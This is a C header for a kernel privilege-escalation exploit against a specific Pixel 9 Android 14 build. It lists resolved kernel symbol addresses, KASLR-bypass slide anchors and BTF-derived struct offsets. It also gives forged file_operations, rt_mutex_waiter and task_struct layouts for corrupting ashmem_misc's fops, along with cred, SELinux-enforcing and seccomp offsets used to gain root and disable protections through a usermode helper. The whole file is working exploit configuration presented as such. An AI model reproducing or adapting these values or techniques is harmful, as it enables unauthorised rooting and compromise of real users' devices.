// tokay — Pixel 9, Android 14 (launch build)
// Build: AD1A.240905.004
// Kernel: 6.1.75-android14-11-ga9c2920233e0-ab12039621  (KMI android14-6.1)
// CI build: 12039621 (kernel_aarch64, clang 17, PGO/BOLT/LTO)
//
// PROVENANCE
// ==========
// Two independent sources, both carved out of the same build — no value
// below is inherited from another target and none is guessed:
//
//  1. Symbol addresses — the unstripped vmlinux for CI build 12039621
//     (kernel-vmlinux/12039621-vmlinux, llvm-nm, 126551 symbols), whose
//     .text section was verified byte-identical to the kernel Image
//     unpacked (magiskboot) from boot/boot-tokay6175.img (md5 of .text
//     matches; Image header: text_offset=0, image_size=0x21d0000, magic
//     ARMd). Every symbol referenced here was resolved by name; nothing
//     was pattern-matched or approximated. The vmlinux↔Image mapping is
//     linear: file offset == VA - KIMAGE_TEXT_BASE.
//
//  2. Struct member offsets — the kernel's own BTF blob in the vmlinux
//     (CONFIG_DEBUG_INFO_BTF=y, .BTF at file offset 0x15e48f4, 3452303
//     bytes, magic 0xeb9f). BTF is emitted by pahole from the built
//     vmlinux's DWARF, so it describes *this* build's real layout.
//     (Moot here: CONFIG_RANDSTRUCT_NONE=y in the embedded IKCONFIG.)
//
// 3. Empirical cross-checks on the Image itself: init_task.tasks
//    self-pointer, real_parent = &init_task, real_cred == cred ==
//    &init_cred, comm "swapper", pid 0; init_cred usage=4, uids 0, caps
//    CAP_FULL (0xffffffff,0x1ff) at 0x30/0x38/0x40; ashmem_fops' llseek/
//    read_iter/ioctl/compat_ioctl/mmap/open/release/show_fdinfo slots
//    land on the matching functions; ashmem_misc.fops (0x10) ==
//    &ashmem_fops; random_table[4].data == &sysctl_bootid; loggers[0][1]
//    distance nfulnl_logger - loggers[0][1] == 0xb0.
//
// The kernel line is 6.1.75 (July 2024) — roughly a year older than the
// 6.1.157 of tegu/husky/lynx. The android14-6.1 KMI is frozen, so every
// struct offset in this header is byte-identical to the 6.1.157 headers
// (BTF-verified here, not assumed); only the symbol addresses moved, and
// they were all re-extracted from THIS build. Note the layout difference
// vs the 6.1.157 targets: this build's .data starts at 0x1f40000 (not
// 0x2000000), so .data symbols here carry 0x1f4xxxx offsets, and the
// "digit-drop" heuristic from FIND_OFFSET_EN.md (".data must start with
// 0x02") does not apply verbatim — the arithmetic addr - KIMAGE_TEXT_BASE
// is what was used, verified against the ELF section table.
//
// STATUS: complete, self-consistent, never run on hardware. Every value
// is sourced, but "sourced" is not "tested" — an exploit that gets a
// live kernel write wrong does not fail cleanly. The stack-frame
// geometry (SLIDE_PSELECT_WORD_SHIFT) was re-measured on this build and
// happens to be identical to tegu/6.1.157 (see that note below).

#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "tokay-AD1A.240905.004-app"
#else
#define BUILD_VARIANT_LABEL "tokay-AD1A.240905.004-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
// Incremental not confirmed against a physical device — verify with
// `getprop ro.build.fingerprint` on the target and fix if it differs.
// (tegu's fingerprint was likewise corrected on-device after porting.)
#define BUILD_FINGERPRINT "google/tokay/tokay:14/AD1A.240905.004/12077868:user/release-keys"
#endif

// ── Base / memory layout ────────────────────────────────────────────────
// KIMAGE_TEXT_BASE == entry point of the vmlinux ELF == the `kimage_vaddr`
// symbol content (0xffffffc008000000) — both read from this build. On
// arm64, KIMAGE_VADDR == MODULES_END == _PAGE_END(VA_BITS_MIN) +
// MODULES_VSIZE; this build has CONFIG_ARM64_VA_BITS=39 (IKCONFIG), so
// _PAGE_END is 0xffffffc000000000 and the 6.1 module region is 128MB.
// PHYS_OFFSET inherited from the same-device zuma targets (tokay
// CP2A.260705.006 / tegu): zuma DRAM base 0x80000000; the DTB lives in
// vendor_kernel_boot, which was not available for this image, but the
// physical memory map is SoC-fixed and identical to the other Pixel 9
// targets. text_offset=0 (Image header) ⇒ kernel loaded at 0x80000000.
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

// ── Kernel symbol offsets (llvm-nm on vmlinux 12039621, by name) ────────
#define ASHMEM_IOCTL_OFF            0x00bffe00ULL
#define ASHMEM_MMAP_OFF             0x00c00740ULL
#define ASHMEM_OPEN_OFF             0x00c00960ULL
#define ASHMEM_RELEASE_OFF          0x00c009e8ULL
#define ASHMEM_SHOW_FDINFO_OFF      0x00c00b08ULL
#define ASHMEM_FOPS_OFF             0x0121b918ULL

// &ashmem_misc.fops = ashmem_misc + offsetof(struct miscdevice, fops) =
// 0x10 (BTF). On this build the array is a SINGLE miscdevice named
// `ashmem_misc` (0x50 bytes = one struct miscdevice), not `ashmem_miscs[]`
// as on 6.1.157 — same idea, different symbol name. Verified empirically:
// the pointer at ashmem_misc+0x10 == &ashmem_fops, name "ashmem",
// minor 255.
//
// Naming trap (why this is a +0x10 slot, not a fops table): misc_open()
// does fops_get(c->fops) / replace_fops(file, new_fops) on the
// miscdevice's own ->fops field, so overwriting the global misc_fops
// (.rodata, and transiently replaced) would never be observable. The
// target of the corruption is ashmem_misc + 0x10.
#define ASHMEM_MISC_FOPS_OFF        0x020ae5b8ULL /* ashmem_misc(0x20ae5a8) + 0x10 */

// NAMING: kallsyms spells this `compat_ashmem_ioctl`, not
// `ashmem_compat_ioctl`. Cross-checked against the live ashmem_fops
// struct in the image: its compat_ioctl slot (FOPS_COMPAT_IOCTL_OFF,
// 0x58) holds exactly this address.
#define ASHMEM_COMPAT_IOCTL_OFF     0x00c006e8ULL

#define CONFIGFS_READ_ITER_OFF      0x045b768ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x045bc98ULL
#define NOOP_LLSEEK_OFF             0x0391808ULL
#define INIT_TASK_OFF               0x1f5ee00ULL
#define ROOT_TASK_GROUP_OFF         0x2135580ULL
#define SELINUX_BLOB_SIZES_OFF      0x154e5a0ULL
#define SECURITY_HOOK_HEADS_OFF     0x154de98ULL
#define KMALLOC_CACHES_OFF          0x154d9d8ULL
#define ANON_PIPE_BUF_OPS_OFF       0x10b3110ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00d60d0ULL
#define SYSTEM_UNBOUND_WQ_OFF       0x1f4ae68ULL

// DIVERGENCE: `copy_splice_read` does not exist on 6.1 — it is the 6.6-era
// rename/rework of the generic "splice by driving ->read_iter" helper. Its
// 6.1 counterpart is `generic_file_splice_read`, which has the identical
// file_operations::splice_read prototype
// (struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int)
// and likewise funnels through call_read_iter — i.e. into the
// configfs_read_iter we plant at FOPS_READ_ITER_OFF. The payload only ever
// *writes* this pointer into the forged fops table; it never splices
// through it, so it has to be a correctly-typed, plausible function
// pointer rather than a behaviourally identical one.
#define COPY_SPLICE_READ_OFF        0x03deb44ULL /* generic_file_splice_read */

// DIVERGENCE: 6.1 has no bare `selinux_enforcing` global — SELinux state
// lives in `struct selinux_state selinux_state`, and .enforcing is its
// first member (byte offset 0x0, per BTF), so the address is the struct's
// own. Verified not randomized: CONFIG_RANDSTRUCT_NONE=y in IKCONFIG.
#define SELINUX_ENFORCING_OFF       0x2187b18ULL /* selinux_state + 0x0 */

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)

// ── Slide references (KASLR bypass anchors) ─────────────────────────────
#define SLIDE_NFULNL_LOGGER_OFF     0x1f52a38ULL

// &loggers[0][1], not the `loggers` symbol itself. loggers is
//   struct nf_logger *loggers[NFPROTO_NUMPROTO][NF_LOG_TYPE_MAX]
// so [0][1] is one pointer in: the NFPROTO_UNSPEC / NF_LOG_TYPE_ULOG slot,
// which nfnetlink_log fills with &nfulnl_logger at registration
// (CONFIG_NETFILTER_NETLINK_LOG=y, built-in, so the slot is populated at
// boot). The image confirms the type: nfulnl_logger field at +0x08 reads
// 1 = NF_LOG_TYPE_ULOG, name "nfnetlink_log". Slot [0][0] is the LOG-type
// entry, which nothing registers and which stays zero — pointing the leak
// there makes boot_id read 16 zero bytes.
//
// Cross-check: nfulnl_logger - loggers[0][1] = 0x1f52a38 - 0x1f52988 =
// 0xb0 — the same distance measured on 6.1.145 and 6.1.157. A consistent
// array layout across three android14-6.1 builds confirms the slot.
#define SLIDE_LOGGERS_0_1_OFF       0x1f52988ULL /* loggers(0x1f52980) + 8 */

// Despite the name this is not about boot_id randomness. slide61.c plants
// it as the rb_left pointer of the forged waiter's rbtree nodes, so the
// tree rotation clobbers whatever sits there; restore_slide_boot_id()
// then puts the original value back. That tells us exactly what it must
// be: a kernel data slot whose correct content is &sysctl_bootid. That is
// the .data field of the `boot_id` entry in random_table[], located by
// walking random_table (0x206a2b8) in 0x40-byte struct ctl_table strides
// to the entry whose procname is "boot_id" (index 4) and confirming its
// .data already equals sysctl_bootid (SLIDE_SYSCTL_BOOTID, below).
// Verified empirically on the Image: random_table[4].data == 0xffffffc00a1a8930
// == &sysctl_bootid; uuid entry has .data == NULL.
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x206a3c0ULL /* &random_table[4].data */

#define SLIDE_INIT_TASK_OFF         INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF   ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF     0x21a8930ULL

// DIVERGENCE: overrides slide61.c's 3. This is not a symbol or a struct
// offset — it is where futex_wait_requeue_pi's on-stack rt_mutex_waiter
// lands relative to core_sys_select's stack_fds array, both measured from
// the same syscall-entry sp, so it falls out of this kernel's compiled
// stack frames. Re-measured on THIS build's prologues:
//
//   __arm64_sys_pselect6    sub sp, sp, #0x90
//   core_sys_select         sub sp, sp, #0x1c0 ; add x23, sp, #0x50  <- bits
//     => fd_sets   = sp_entry - 0x90 - 0x1c0 + 0x50  = sp_entry - 0x200
//
//   __arm64_sys_futex       sub sp, sp, #0x70
//   do_futex                sub sp, sp, #0x60
//   futex_wait_requeue_pi   sub sp, sp, #0x1b0 ; add x2, sp, #0x98   <- rt_waiter
//     (confirmed twice: same sp+0x98 is passed to rt_mutex_wait_proxy_lock
//      as its waiter argument — 6.1 arg order (lock, to, waiter) — and to
//      rt_mutex_cleanup_proxy_lock as its waiter argument)
//     => rt_waiter = sp_entry - 0x70 - 0x60 - 0x1b0 + 0x98 = sp_entry - 0x1e8
//
//   shift = (0x200 - 0x1e8) / 8 = 3 words
//
// All five frames are fixed-size with a single prologue adjustment, so
// there is no dynamic stack sizing to account for. The values are
// byte-identical to the 6.1.157 measurement (tegu/husky/lynx), which is
// consistent with these stack frames being compiler-stable across the
// android14-6.1 line. With the waiter being 0x58 bytes (11 words), words
// 3..13 are used, which still lands inside in/out/ex (words 0..14).
#define SLIDE_PSELECT_WORD_SHIFT 3


#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

// ── Page layout (payload-internal constants, not build-specific) ────────
#define LOCK_OFF        0x1350
#define W0_OFF          0x2220
#define FOPS_OFF        0x1000
#define SCRATCH_OFF     0x3000
#define RIGHT_OFF       0x4440
#define LEFT_OFF        0x5550
#define FAKE_TASK_OFF   0x3200

// ── struct file_operations (BTF, size 0x110) ────────────────────────────
// DIVERGENCE from the 6.6 layout: 6.6 dropped ->sendpage from
// file_operations; 6.1 still has it, which shifts the tail. SPLICE_READ
// in particular is 0xc8 here — 0xc0 is ->splice_write, and writing our
// read helper there would be silently wrong. The layout was verified
// empirically against the live ashmem_fops table (all slots land on the
// matching ashmem_* functions).
#define FOPS_OWNER_OFF          0x00
#define FOPS_LLSEEK_OFF         0x08
#define FOPS_READ_OFF           0x10
#define FOPS_WRITE_OFF          0x18
#define FOPS_READ_ITER_OFF      0x20
#define FOPS_WRITE_ITER_OFF     0x28
#define FOPS_IOCTL_OFF          0x50
#define FOPS_COMPAT_IOCTL_OFF   0x58
#define FOPS_MMAP_OFF           0x60
#define FOPS_OPEN_OFF           0x70
#define FOPS_RELEASE_OFF        0x80
#define FOPS_SPLICE_READ_OFF    0xc8
#define FOPS_SHOW_FDINFO_OFF    0xe0

// ── struct rt_mutex_waiter (BTF, size 0x58) ─────────────────────────────
// DIVERGENCE, and the one place where 6.1 is not merely shifted but shaped
// differently. 6.6 wraps each rbtree node in `struct rt_waiter_node`
// { rb_node entry; int prio; u64 deadline; }, so tree and pi_tree each
// carry their own prio/deadline. 6.1 has a flat struct with a single prio
// and a single deadline shared by both nodes. The TREE_/PI_TREE_ prio and
// deadline macros therefore deliberately alias onto the same bytes here.
// That is sound rather than a fudge: util.c and slide61.c write
// FAKE_WAITER_PRIO to both prio macros and 0 to both deadline macros, so
// the aliased writes are idempotent. Field order also differs — task/lock/
// wake_state precede prio/deadline on 6.1 and follow them on 6.6.
// (struct rt_waiter_node does not exist in this BTF — 6.6-only.)
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18
#define FAKE_WAITER_TASK_OFF            0x30
#define FAKE_WAITER_LOCK_OFF            0x38
#define FAKE_WAITER_WAKE_STATE_OFF      0x40
#define FAKE_WAITER_TREE_PRIO_OFF       0x44 /* aliases pi_tree prio */
#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x44 /* aliases tree prio */
#define FAKE_WAITER_TREE_DEADLINE_OFF   0x48 /* aliases pi_tree deadline */
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48 /* aliases tree deadline */
#define FAKE_WAITER_WW_CTX_OFF          0x50

// ── struct task_struct (BTF, size 0x12c0) ───────────────────────────────
// DIVERGENCE from 6.6: fields past ~0x5d8 moved by +0x18 (pid 0x618→0x630,
// cred 0x820→0x838, comm 0x830→0x848, seccomp 0x8e8→0x900, the whole
// pi_* block 0x90c→0x924). The head of the struct
// (usage/prio/normal_prio/sched_task_group) is unchanged.
#define FAKE_TASK_USAGE_OFF         0x40
#define FAKE_TASK_PRIO_OFF          0x84
#define FAKE_TASK_NORMAL_PRIO_OFF   0x8c
#define FAKE_TASK_TASK_GROUP_OFF    0x348 /* ->sched_task_group */
#define FAKE_TASK_PI_LOCK_OFF       0x924
#define FAKE_TASK_PI_WAITERS_OFF    0x938
#define FAKE_TASK_PI_TOP_TASK_OFF   0x948
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950

#define TASK_PID_OFF                  0x630
#define TASK_TGID_OFF                 0x634
#define TASK_REAL_PARENT_OFF          0x640
#define TASK_REAL_CRED_OFF            0x830
#define TASK_CRED_OFF                 0x838
#define TASK_COMM_OFF                 0x848
#define TASK_TASKS_OFF                0x550
#define TASK_SECCOMP_OFF              0x900
#define TASK_ATOMIC_FLAGS_OFF         0x5f0
// task_struct embeds struct thread_info at 0x0 and ->flags is its first
// member (BTF: thread_info.flags @ 0x00), so this stays 0x00.
#define TASK_THREAD_INFO_FLAGS_OFF    0x00

// ── struct cred (BTF, size 0xb0) ────────────────────────────────────────
// DIVERGENCE: uniformly 4 bytes lower than the 6.6 layout, because 6.6
// widened cred->usage from atomic_t to atomic_long_t. CRED_CAPS_OFF
// points at cap_inheritable; the five kernel_cap_t sets are contiguous
// 8-byte entries in the order root.c's CRED_CAP_* indices expect
// (inheritable, permitted, effective, bset, ambient → 0x28..0x50).
#define CRED_UID_OFF                  4
#define CRED_SECUREBITS_OFF           36
#define CRED_CAPS_OFF                 40
#define CRED_SECURITY_OFF             120
// Default only — root.c overwrites selinux_cred_blob_off at runtime from
// SELINUX_BLOB_SIZES.lbs_cred before it is used.
#define SELINUX_CRED_BLOB_OFF         0
// struct task_security_struct (BTF, size 0x18)
#define SELINUX_CRED_OSID_OFF         0
#define SELINUX_CRED_SID_OFF          4

// ── struct seccomp (BTF, size 0x10) ─────────────────────────────────────
#define SECCOMP_MODE_OFF              0x00
#define SECCOMP_FILTER_COUNT_OFF      0x04
#define SECCOMP_FILTER_OFF            0x08
// arch constants, not struct members and not in BTF: TIF_SECCOMP is bit 11
// in arch/arm64/include/asm/thread_info.h and PFA_NO_NEW_PRIVS is the
// first PFA_* in include/linux/sched.h. Both unchanged between 6.1 and 6.6.
#define TIF_SECCOMP_BIT               11
#define PFA_NO_NEW_PRIVS_BIT          0

// DIVERGENCE: mm_struct->owner, 0x408 on 6.6.
#define MM_OWNER_OFF                  824

// DIVERGENCE: overrides common.h's 0x500, which is the 6.6 value. This is
// the SLUB object size of the mm_struct cache, and KernelSnitch strides
// the slab by it — a wrong value means the scan never lands on a live
// mm_struct and the leak fails on every retry.
//
// sizeof(struct mm_struct) is 960 in this build's BTF, but that is NOT the
// object size. proc_caches_init() sizes the cache as
//     mm_size = sizeof(struct mm_struct) + cpumask_size();
// because mm_struct ends with the cpu_bitmap[] flexible array, which BTF
// reports as zero-length. CONFIG_NR_CPUS=32 and CONFIG_CPUMASK_OFFSTACK
// is unset (IKCONFIG), so cpumask_size() is BITS_TO_LONGS(32) * 8 = 8:
//     960 + 8 = 968, then SLAB_HWCACHE_ALIGN rounds up to the 64-byte
//     cache line => 1024.
#define MM_STRUCT_SZ                  0x400

// DIVERGENCE: overrides common.h's 2 / 4, which are the 6.6 values. From
// this build's BTF, enum kmalloc_cache_type is
//   KMALLOC_NORMAL=0  KMALLOC_DMA=0  KMALLOC_CGROUP=1  KMALLOC_RECLAIM=2
//   NR_KMALLOC_TYPES=3
// KMALLOC_DMA collapses onto KMALLOC_NORMAL because CONFIG_ZONE_DMA is not
// set in this build (only CONFIG_ZONE_DMA32), which pulls CGROUP down to
// row 1. pipe_buffer arrays are allocated with GFP_KERNEL_ACCOUNT and so
// live in the CGROUP row; reading row 2 here would hand back the RECLAIM
// kmalloc-2048 cache instead, and pipe_cache_matches() would never match.
// The row count matters too: KMALLOC_CACHE_SLOTS sizes the bulk read of
// kmalloc_caches, and 4 rows would read past the end of a 3-row array
// (the `kmalloc_caches` symbol here is 0x150 bytes = 3 rows × 14 caches
// × 8, confirming 3 rows).
#define KMALLOC_CGROUP_TYPE           1
#define KMALLOC_CACHE_TYPES           3
#define PIPE_BUFFER_SIZE              0x28
// pipe_buffer arrays are PIPE_BUFFER_SLOTS * PIPE_BUFFER_SIZE = 32 * 0x28
// = 1280 bytes, so they come out of kmalloc-2k: index 11.
#define KMALLOC_PIPE_INDEX            11

// ── main route transport (src/61) ───────────────────────────────────────
// Use the TCP route, not pselect (inherited from the tested 6.1 targets —
// tegu and tokay-CP2A both run MAIN_TCP_ROUTE=1). tcp_zerocopy_receive
// and shmem_fallocate exist in this kernel (0x0e16550 / 0x02e537c), so
// the route's machinery is present. The pselect main route is the
// documented 6.1 failure mode: rb_leftmost misalignment in
// rt_mutex_top_waiter() reading lock->waiters.
#define MAIN_TCP_ROUTE_DEFAULT        1
#define MAIN_TCP_PAYLOAD_DEFAULT      1

// Distinct from slide61.c's own SLIDE_PSELECT_WORD_SHIFT (3): this one
// places the fd_set word map for the pselect *main* route. The compiled
// stack frames of this build are identical to the 6.1.157 measurements
// (verified above for the slide path), so the same shift applies.
#define PSELECT_WAITER_WORD_SHIFT     1

// ── struct page / struct slab (BTF) ─────────────────────────────────────
// DIVERGENCE: STRUCT_SLAB_CACHE_OFF is 0x08 on 6.6. 6.6 hoisted
// ->slab_cache to sit directly after __page_flags; on 6.1 the slab_list /
// rcu_head union still comes first, putting slab_cache at 0x18. struct
// page itself is unchanged (compound_head 0x08, page_type 0x30, size
// 0x40).
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x18
#define STRUCT_PAGE_TYPE_OFF          0x30

#define PIPE_BUFFER_SLOTS             32
#define PIPE_BUF_FLAG_CAN_MERGE       0x10

// ── struct workqueue_struct / pool_workqueue / worker_pool / work_struct ─
// BTF-confirmed; identical to the 6.1.157 targets.
#define WQ_DFL_PWQ_OFF    0xb0
#define PWQ_POOL_OFF       0x00
#define PWQ_WQ_OFF         0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF     0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF  0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF  0x28
#define POOL_NR_IDLE_OFF   0x3c

#define WORK_DATA_OFF  0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF  0x18

// ── struct configfs_buffer (BTF, size 0x80) — identical to the 6.1.157 ──
#define CFG_PAGE_OFF             16
#define CFG_NEEDS_READ_FILL_OFF  80
#define CFG_BIN_BUFFER_OFF       88
#define CFG_BIN_BUFFER_SIZE_OFF  96
#define CFG_CB_MAX_SIZE_OFF      100

// ── su_daemon UMH ───────────────────────────────────────────────────────
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

#endif
